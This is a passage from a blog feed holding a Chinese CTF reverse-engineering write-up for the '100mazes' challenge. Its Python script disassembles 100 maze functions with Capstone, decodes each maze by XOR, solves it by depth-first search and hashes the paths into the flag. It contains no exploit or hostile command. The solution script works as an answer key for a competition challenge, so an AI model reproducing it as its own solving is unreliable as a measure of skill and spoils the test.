class="hljs-keyword">in</span> md.disasm(data, offset):<br>        ins = <span class="hljs-string">&quot;0x%x:\t%s\t%s&quot;</span> % (i.address, i.mnemonic, i.op_str)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;movbyte ptr [rbp&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            <span class="hljs-keyword">if</span> inscnt &lt; <span class="hljs-number">629</span>:<br>                <span class="hljs-comment">#print(ins)</span><br>                map1.append(<span class="hljs-built_in">int</span>(i.op_str.split(<span class="hljs-string">&#x27;, &#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>))<br>            inscnt += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;movdword ptr [rbp&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            print(ins)<br>            <span class="hljs-keyword">if</span> inscnt2 &lt; <span class="hljs-number">2</span>:<br>                map3.append(<span class="hljs-built_in">int</span>(i.op_str.split(<span class="hljs-string">&#x27;, &#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>))<br>            inscnt2 += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;learax, [rip +&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            print(ins)<br>            off1 = i.op_str[<span class="hljs-number">12</span>:-<span class="hljs-number">1</span>]<br>            off1 = <span class="hljs-built_in">int</span>(off1, <span class="hljs-number">16</span>) + i.address + <span class="hljs-number">7</span><br>            map2_data = data_bin[off1: off1 + <span class="hljs-number">4</span> * <span class="hljs-number">625</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">625</span>):<br>                map2.append(struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, map2_data[i * <span class="hljs-number">4</span>: i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span>])[<span class="hljs-number">0</span>])<br>    data = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">625</span>):<br>        data.append(map1[i] ^ map2[i])<br>    <span class="hljs-keyword">return</span> data, <span class="hljs-built_in">bytearray</span>(map1[-<span class="hljs-number">4</span>:]), map3<br></code></pre></td></tr></table></figure><h2 id="地图寻路"><a href="#地图寻路" class="headerlink" title="地图寻路"></a>地图寻路</h2><p>手撕一个 dfs 就出了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkValid</span>(<span class="hljs-params"><span class="hljs-built_in">map</span>, x, y</span>):</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> y &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> x &gt; <span class="hljs-number">24</span> <span class="hljs-keyword">or</span> y &gt; <span class="hljs-number">24</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>[y * <span class="hljs-number">25</span> + x] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;.&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params"><span class="hljs-built_in">map</span>, startX, startY, direct, path</span>):</span><br>    <span class="hljs-built_in">map</span>[startY * <span class="hljs-number">25</span> + startX] = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;*&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(path) == <span class="hljs-number">15</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, path<br><br>    all_dir = []<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX, startY - <span class="hljs-number">1</span>):<br>        all_dir.append((startX, startY - <span class="hljs-number">1</span>, direct[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX, startY + <span class="hljs-number">1</span>):<br>        all_dir.append((startX, startY + <span class="hljs-number">1</span>, direct[<span class="hljs-number">2</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX - <span class="hljs-number">1</span>, startY):<br>        all_dir.append((startX - <span class="hljs-number">1</span>, startY, direct[<span class="hljs-number">3</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX + <span class="hljs-number">1</span>, startY):<br>        all_dir.append((startX + <span class="hljs-number">1</span>, startY, direct[<span class="hljs-number">4</span>]))<br><br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> all_dir:<br>        result = solve(<span class="hljs-built_in">map</span>, <span class="hljs-built_in">dir</span>[<span class="hljs-number">0</span>], <span class="hljs-built_in">dir</span>[<span class="hljs-number">1</span>], direct, path + <span class="hljs-built_in">dir</span>[<span class="hljs-number">2</span>])<br>        <span class="hljs-keyword">if</span> result[<span class="hljs-number">0</span>] == <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>例如对于第一轮</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">print(solve(map1, <span class="hljs-number">4</span>, <span class="hljs-number">24</span>, <span class="hljs-string">&#x27;kgMp9&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="完整自动化脚本"><a href="#完整自动化脚本" class="headerlink" title="完整自动化脚本"></a>完整自动化脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> Cs<br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">offset</span>):</span><br>    data_bin = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;100mazes&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    data = data_bin[offset: offset + <span class="hljs-number">0x199b</span> + <span class="hljs-number">20</span>]<br>    md = Cs(CS_ARCH_X86, CS_MODE_64)<br>    inscnt = <span class="hljs-number">0</span><br>    inscnt2 = <span class="hljs-number">0</span><br>    map1 = []<br>    map2 = []<br>    map3 = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> md.disasm(data, offset):<br>        ins = <span class="hljs-string">&quot;0x%x:\t%s\t%s&quot;</span> % (i.address, i.mnemonic, i.op_str)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;movbyte ptr [rbp&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            <span class="hljs-keyword">if</span> inscnt &lt; <span class="hljs-number">629</span>:<br>                <span class="hljs-comment">#print(ins)</span><br>                map1.append(<span class="hljs-built_in">int</span>(i.op_str.split(<span class="hljs-string">&#x27;, &#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>))<br>            inscnt += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;movdword ptr [rbp&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            <span class="hljs-keyword">if</span> inscnt2 &lt; <span class="hljs-number">2</span>:<br>                map3.append(<span class="hljs-built_in">int</span>(i.op_str.split(<span class="hljs-string">&#x27;, &#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>))<br>            inscnt2 += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;learax, [rip +&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            off1 = i.op_str[<span class="hljs-number">12</span>:-<span class="hljs-number">1</span>]<br>            off1 = <span class="hljs-built_in">int</span>(off1, <span class="hljs-number">16</span>) + i.address + <span class="hljs-number">7</span><br>            map2_data = data_bin[off1: off1 + <span class="hljs-number">4</span> * <span class="hljs-number">625</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">625</span>):<br>                map2.append(struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, map2_data[i * <span class="hljs-number">4</span>: i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span>])[<span class="hljs-number">0</span>])<br><br>    data = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">625</span>):<br>        data.append(map1[i] ^ map2[i])<br>    <span class="hljs-keyword">return</span> data, <span class="hljs-built_in">bytearray</span>(map1[-<span class="hljs-number">4</span>:]), map3<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkValid</span>(<span class="hljs-params"><span class="hljs-built_in">map</span>, x, y</span>):</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> y &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> x &gt; <span class="hljs-number">24</span> <span class="hljs-keyword">or</span> y &gt; <span class="hljs-number">24</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>[y * <span class="hljs-number">25</span> + x] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;.&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params"><span class="hljs-built_in">map</span>, startX, startY, direct, path</span>):</span><br>    <span class="hljs-built_in">map</span>[startY * <span class="hljs-number">25</span> + startX] = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;*&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(path) == <span class="hljs-number">15</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, path<br><br>    all_dir = []<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX, startY - <span class="hljs-number">1</span>):<br>        all_dir.append((startX, startY - <span class="hljs-number">1</span>, direct[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX, startY + <span class="hljs-number">1</span>):<br>        all_dir.append((startX, startY + <span class="hljs-number">1</span>, direct[<span class="hljs-number">2</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX - <span class="hljs-number">1</span>, startY):<br>        all_dir.append((startX - <span class="hljs-number">1</span>, startY, direct[<span class="hljs-number">3</span>]))<br>    <span class="hljs-keyword">if</span> checkValid(<span class="hljs-built_in">map</span>, startX + <span class="hljs-number">1</span>, startY):<br>        all_dir.append((startX + <span class="hljs-number">1</span>, startY, direct[<span class="hljs-number">4</span>]))<br><br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> all_dir:<br>        result = solve(<span class="hljs-built_in">map</span>, <span class="hljs-built_in">dir</span>[<span class="hljs-number">0</span>], <span class="hljs-built_in">dir</span>[<span class="hljs-number">1</span>], direct, path + <span class="hljs-built_in">dir</span>[<span class="hljs-number">2</span>])<br>        <span class="hljs-keyword">if</span> result[<span class="hljs-number">0</span>] == <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printMap</span>(<span class="hljs-params"><span class="hljs-built_in">map</span></span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25</span>):<br>        line = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25</span>):<br>            line += <span class="hljs-built_in">chr</span>(map1[i * <span class="hljs-number">25</span> + j])<br>        print(line)<br><br>funcs = <span class="hljs-string">&quot;&quot;&quot;maze_1(void).text000000000000078A00001AC500000C7800000000R....BT.</span><br><span class="hljs-string">maze_2(void).text000000000000224F00001A8F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_3(void).text0000000000003CDE00001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_4(void).text000000000000574F00001A2F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_5(void).text000000000000717E00001A5300000C7800000000R....BT.</span><br><span class="hljs-string">maze_6(void).text0000000000008BD100001A5900000C7800000000R....BT.</span><br><span class="hljs-string">maze_7(void).text000000000000A62A00001A2F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_8(void).text000000000000C05900001B2500000C7800000000R....BT.</span><br><span class="hljs-string">maze_9(void).text000000000000DB7E00001A2300000C7800000000R....BT.</span><br><span class="hljs-string">maze_10(void).text000000000000F5A100001A8300000C7800000000R....BT.</span><br><span class="hljs-string">maze_11(void).text0000000000011024000019B100000C7800000000R....BT.</span><br><span class="hljs-string">maze_12(void).text00000000000129D500001A4700000C7800000000R....BT.</span><br><span class="hljs-string">maze_13(void).text000000000001441C00001A8300000C7800000000R....BT.</span><br><span class="hljs-string">maze_14(void).text0000000000015E9F00001A6B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_15(void).text000000000001790A00001A7D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_16(void).text000000000001938700001AD700000C7800000000R....BT.</span><br><span class="hljs-string">maze_17(void).text000000000001AE5E00001A9B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_18(void).text000000000001C8F900001AB300000C7800000000R....BT.</span><br><span class="hljs-string">maze_19(void).text000000000001E3AC00001AAD00000C7800000000R....BT.</span><br><span class="hljs-string">maze_20(void).text000000000001FE5900001B2B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_21(void).text000000000002198400001A9B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_22(void).text000000000002341F00001A9B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_23(void).text0000000000024EBA00001ADD00000C7800000000R....BT.</span><br><span class="hljs-string">maze_24(void).text000000000002699700001A5900000C7800000000R....BT.</span><br><span class="hljs-string">maze_25(void).text00000000000283F000001A3500000C7800000000R....BT.</span><br><span class="hljs-string">maze_26(void).text0000000000029E2500001A8300000C7800000000R....BT.</span><br><span class="hljs-string">maze_27(void).text000000000002B8A800001A4700000C7800000000R....BT.</span><br><span class="hljs-string">maze_28(void).text000000000002D2EF00001AB900000C7800000000R....BT.</span><br><span class="hljs-string">maze_29(void).text000000000002EDA800001AB300000C7800000000R....BT.</span><br><span class="hljs-string">maze_30(void).text000000000003085B00001AA100000C7800000000R....BT.</span><br><span class="hljs-string">maze_31(void).text00000000000322FC00001A8900000C7800000000R....BT.</span><br><span class="hljs-string">maze_32(void).text0000000000033D8500001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_33(void).text000000000003581A00001A7D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_34(void).text000000000003729700001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_35(void).text0000000000038D2C00001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_36(void).text000000000003A79D00001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_37(void).text000000000003C23200001A7D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_38(void).text000000000003DCAF00001A8F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_39(void).text000000000003F73E00001A7700000C7800000000R....BT.</span><br><span class="hljs-string">maze_40(void).text00000000000411B500001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_41(void).text0000000000042C4A00001AA100000C7800000000R....BT.</span><br><span class="hljs-string">maze_42(void).text00000000000446EB00001A5300000C7800000000R....BT.</span><br><span class="hljs-string">maze_43(void).text000000000004613E00001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_44(void).text0000000000047BD300001A6B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_45(void).text000000000004963E00001B4F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_46(void).text000000000004B18D00001A5300000C7800000000R....BT.</span><br><span class="hljs-string">maze_47(void).text000000000004CBE000001A6500000C7800000000R....BT.</span><br><span class="hljs-string">maze_48(void).text000000000004E64500001A8300000C7800000000R....BT.</span><br><span class="hljs-string">maze_49(void).text00000000000500C800001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_50(void).text0000000000051B5D00001B0D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_51(void).text000000000005366A00001A6B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_52(void).text00000000000550D500001ABF00000C7800000000R....BT.</span><br><span class="hljs-string">maze_53(void).text0000000000056B9400001AE900000C7800000000R....BT.</span><br><span class="hljs-string">maze_54(void).text000000000005867D00001A3B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_55(void).text000000000005A0B800001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_56(void).text000000000005BB4D00001A5900000C7800000000R....BT.</span><br><span class="hljs-string">maze_57(void).text000000000005D5A600001AD100000C7800000000R....BT.</span><br><span class="hljs-string">maze_58(void).text000000000005F07700001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_59(void).text0000000000060AE800001A3500000C7800000000R....BT.</span><br><span class="hljs-string">maze_60(void).text000000000006251D00001A5900000C7800000000R....BT.</span><br><span class="hljs-string">maze_61(void).text0000000000063F7600001A4D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_62(void).text00000000000659C300001AD700000C7800000000R....BT.</span><br><span class="hljs-string">maze_63(void).text000000000006749A00001AD700000C7800000000R....BT.</span><br><span class="hljs-string">maze_64(void).text0000000000068F7100001AA100000C7800000000R....BT.</span><br><span class="hljs-string">maze_65(void).text000000000006AA1200001AD100000C7800000000R....BT.</span><br><span class="hljs-string">maze_66(void).text000000000006C4E300001B2500000C7800000000R....BT.</span><br><span class="hljs-string">maze_67(void).text000000000006E00800001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_68(void).text000000000006FA9D00001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_69(void).text000000000007150E00001AD700000C7800000000R....BT.</span><br><span class="hljs-string">maze_70(void).text0000000000072FE500001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_71(void).text0000000000074A5600001AD700000C7800000000R....BT.</span><br><span class="hljs-string">maze_72(void).text000000000007652D00001AF500000C7800000000R....BT.</span><br><span class="hljs-string">maze_73(void).text000000000007802200001AFB00000C7800000000R....BT.</span><br><span class="hljs-string">maze_74(void).text0000000000079B1D00001AB900000C7800000000R....BT.</span><br><span class="hljs-string">maze_75(void).text000000000007B5D600001AB900000C7800000000R....BT.</span><br><span class="hljs-string">maze_76(void).text000000000007D08F00001AF500000C7800000000R....BT.</span><br><span class="hljs-string">maze_77(void).text000000000007EB8400001A4700000C7800000000R....BT.</span><br><span class="hljs-string">maze_78(void).text00000000000805CB000019FF00000C7800000000R....BT.</span><br><span class="hljs-string">maze_79(void).text0000000000081FCA00001AF500000C7800000000R....BT.</span><br><span class="hljs-string">maze_80(void).text0000000000083ABF00001ACB00000C7800000000R....BT.</span><br><span class="hljs-string">maze_81(void).text000000000008558A00001A8F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_82(void).text000000000008701900001AAD00000C7800000000R....BT.</span><br><span class="hljs-string">maze_83(void).text0000000000088AC600001ABF00000C7800000000R....BT.</span><br><span class="hljs-string">maze_84(void).text000000000008A58500001A3B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_85(void).text000000000008BFC000001A7700000C7800000000R....BT.</span><br><span class="hljs-string">maze_86(void).text000000000008DA3700001AD100000C7800000000R....BT.</span><br><span class="hljs-string">maze_87(void).text000000000008F50800001ACB00000C7800000000R....BT.</span><br><span class="hljs-string">maze_88(void).text0000000000090FD300001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_89(void).text0000000000092A6800001B0D00000C7800000000R....BT.</span><br><span class="hljs-string">maze_90(void).text000000000009457500001ABF00000C7800000000R....BT.</span><br><span class="hljs-string">maze_91(void).text000000000009603400001A7100000C7800000000R....BT.</span><br><span class="hljs-string">maze_92(void).text0000000000097AA500001ACB00000C7800000000R....BT.</span><br><span class="hljs-string">maze_93(void).text000000000009957000001A1100000C7800000000R....BT.</span><br><span class="hljs-string">maze_94(void).text000000000009AF8100001A9B00000C7800000000R....BT.</span><br><span class="hljs-string">maze_95(void).text000000000009CA1C00001B0700000C7800000000R....BT.</span><br><span class="hljs-string">maze_96(void).text000000000009E52300001A9500000C7800000000R....BT.</span><br><span class="hljs-string">maze_97(void).text000000000009FFB800001AAD00000C7800000000R....BT.</span><br><span class="hljs-string">maze_98(void).text00000000000A1A6500001AF500000C7800000000R....BT.</span><br><span class="hljs-string">maze_99(void).text00000000000A355A00001B1F00000C7800000000R....BT.</span><br><span class="hljs-string">maze_100(void).text00000000000A507900001A2F00000C7800000000R....BT.&quot;&quot;&quot;</span><br><br>total = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> ll <span class="hljs-keyword">in</span> funcs.splitlines():<br>    ll = ll.split(<span class="hljs-string">&quot;&quot;</span>)<br>    addr = <span class="hljs-built_in">int</span>(ll[<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>    map1, dirs, target = decode(addr)<br>    print(<span class="hljs-string">&quot;process:&quot;</span> + <span class="hljs-built_in">hex</span>(addr))<br>    rr = solve(map1, target[<span class="hljs-number">0</span>], target[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;A&#x27;</span> + dirs.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-string">&#x27;&#x27;</span>)<br>    total += rr[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">import</span> hashlib<br>mm = hashlib.md5(total.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br>print(total)<br>print(<span class="hljs-built_in">len</span>(total))<br>d = mm<br>print(<span class="hljs-string">&quot;flag&#123;%s-%s-%s-%s-%s&#125;&quot;</span> % (d[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>],d[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>],d[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>],d[<span class="hljs-number">16</span>:<span class="hljs-number">20</span>],d[<span class="hljs-number">20</span>:<span class="hljs-number">32</span>]))<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;美团CTF-100mazes&quot;&gt;&lt;a href=&quot;#美团CTF-100mazes&quot; class=&quot;headerlink&quot; title=&quot;美团CTF: 100mazes&quot;&gt;&lt;/a&gt;美团CTF: 100mazes&lt;/h1&gt;&lt;p&gt;题目下载:  &lt;a href=&quot;/202</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="Reverse" scheme="https://panda0s.top/tags/Reverse/"/>
    
    <category term="Capstone" scheme="https://panda0s.top/tags/Capstone/"/>
    
  </entry>
  
  <entry>
    <title>美团CTF: matrix</title>
    <link href="https://panda0s.top/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-matrix/"/>
    <id>https://panda0s.top/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-matrix/</id>
    <published>2021-05-23T13:52:23.000Z</published>
    <updated>2021-05-24T16:34:52.244Z</updated>
    
